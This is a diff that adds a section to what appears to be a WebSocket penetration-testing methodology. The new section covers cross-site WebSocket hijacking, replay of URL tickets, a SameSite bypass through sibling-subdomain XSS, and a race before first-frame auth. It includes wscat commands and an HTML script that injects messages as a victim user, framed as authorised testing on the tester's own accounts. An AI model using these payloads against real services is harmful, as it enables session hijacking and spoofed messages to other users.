@@ -63,6 +63,39 @@ Origin checks fail in more ways than "header missing". Still require B's data or
 
 Some edges enforce Origin only on the HTTP/1 `Upgrade`. If h1 is blocked and HTTP/2 is offered, retry with extended CONNECT (`:method CONNECT`, `:protocol websocket`). Same proof gate.
 
+## Phase 2b — Advanced CSWSH & token replay
+
+**Ticket/token in URL — replay across sessions:**
+```bash
+# Capture the WS upgrade URL with ticket param
+# ws://TARGET/ws?ticket=abc123
+# Open a new browser/incognito, connect with the same ticket:
+wscat -c "wss://TARGET/ws?ticket=abc123"
+# If you receive the original user's data, the ticket is not session-bound
+```
+
+**Cross-session message injection (no auth on send):**
+```html
+<script>
+const ws = new WebSocket("wss://TARGET/ws");
+ws.onopen = () => {
+  // Inject a message as if from another user — no auth token required
+  ws.send(JSON.stringify({type:"chat",to:"VICTIM_ID",body:"injected-UNIQ"}));
+};
+</script>
+```
+Confirm: victim's client receives the injected message. One message, your test accounts only.
+
+**SameSite bypass via same-site sibling XSS:**
+If SameSite=Lax blocks cross-site WS cookies, find XSS on any `*.target.com` sibling (even a low-impact reflected XSS). Execute the CSWSH payload from that sibling origin — same-site, cookies sent.
+
+**Missing Origin + first-frame auth race:**
+Connect without Origin header (non-browser client), send a subscribe frame *before* the server's auth challenge:
+```bash
+wscat -c "wss://TARGET/ws" --no-check -H "Origin: " -x '{"type":"subscribe","channel":"admin"}'
+```
+If data arrives before disconnection, the server processes frames before auth completes.
+
 ## Phase 3 — Per-message authz
 Handshake authed ≠ every frame authed. As B (low priv) and as unauth:
 ```
